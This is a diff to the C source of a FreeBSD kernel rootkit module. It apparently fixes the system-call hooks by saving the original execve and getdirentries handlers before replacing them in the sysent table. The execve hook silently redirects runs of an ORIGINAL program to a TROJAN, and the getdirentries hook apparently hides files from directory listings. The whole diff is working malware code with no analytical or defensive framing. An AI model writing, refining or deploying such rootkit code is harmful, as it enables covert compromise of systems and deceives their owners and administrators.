@@ -38,6 +38,9 @@ struct module {
 	modspecific_t data; /* module specific data */
 };
 
+static int (*saved_execve)(struct thread* td, void* syscall_args);
+static int (*saved_getdirentries)(struct thread* td, void* syscall_args);
+
 /*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
@@ -90,10 +93,10 @@ execve_hook(struct thread *td, void *syscall_args)
 	user_ea = (struct execve_args *)addr + sizeof(t_fname);
 	copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
 	/* Execute TROJAN. */
-	return(execve(curthread, user_ea));
+	return(saved_execve(curthread, user_ea));
 	}
 
-	return(execve(td, syscall_args));
+	return(saved_execve(td, syscall_args));
 
 }
 /*
@@ -116,7 +119,7 @@ unsigned int size, count;
 * Store the directory entries found in fd in buf, and record the
 * number of bytes actually transferred.
 */
-getdirentries(td, syscall_args);
+saved_getdirentries(td, syscall_args);
 size = td->td_retval[0];
 /* Does fd actually contain any directory entries? */
 if (size > 0) {
@@ -203,7 +206,12 @@ load(struct module *module, int cmd, void *arg)
 		}
 	}
 	sx_xunlock(&modules_sx);
-	
+
+	//Save hooks
+	saved_execve = sysent[SYS_execve].sy_call;
+	saved_getdirentries = sysent[SYS_getdirentries].sy_call;
+
+
 	sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 	sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 	return(0);
